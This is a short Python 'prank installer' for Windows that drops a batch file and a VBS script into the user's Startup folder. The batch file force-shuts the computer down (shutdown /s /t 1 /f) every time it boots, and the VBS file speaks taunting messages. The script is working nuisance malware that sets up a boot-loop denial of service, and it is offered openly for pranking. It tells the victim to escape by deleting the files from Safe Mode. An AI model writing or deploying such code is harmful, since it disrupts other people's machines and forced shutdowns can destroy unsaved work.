import os
import time

# 🧠 Welcome Message
print("👻 Welcome to the ULTIMATE Shutdown Prank Installer™")
time.sleep(1)
print("🤖 Deploying robotic farewell...")
time.sleep(1)

# 🚪 Startup folder
startup_folder = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)

# 💣 Files to be created
shutdown_path = os.path.join(startup_folder, "shutdown.bat")
voice_path = os.path.join(startup_folder, "robot_farewell.vbs")

# 🧨 Shutdown content
shutdown_content = "@echo off\n" \
                   "echo Your system will self-destruct in 5 seconds...\n" \
                   "timeout /t 2 >nul\n" \
                   "echo Too late to stop it now...\n" \
                   "timeout /t 2 >nul\n" \
                   "echo Goodbye.\n" \
                   "shutdown /s /t 1 /f\n"

# 🔊 Voice content (limited loop to avoid actual torture 😅)
voice_content = "Set S = CreateObject(\"SAPI.SpVoice\")\n" \
                "Dim messages\n" \
                "messages = Array(\"Goodbye human...\", \"See you in the void...\", \"Reboot? Maybe.\", \"Ha ha ha.\")\n" \
                "For i = 0 To UBound(messages)\n" \
                "    S.Speak messages(i)\n" \
                "Next\n"

# 💾 Writing files
with open(shutdown_path, "w") as f:
    f.write(shutdown_content)

with open(voice_path, "w") as f:
    f.write(voice_content)

print("\n🎯 Mission accomplished! Prank successfully installed.")
print("⚠️ WARNING: Your computer will shut down every time it boots up.")
print("💡 Tip: To escape, boot into Safe Mode and delete:")
print("   -", shutdown_path)
print("   -", voice_path)
print("\n🎉 Good luck, brave soul.")

time.sleep(5)
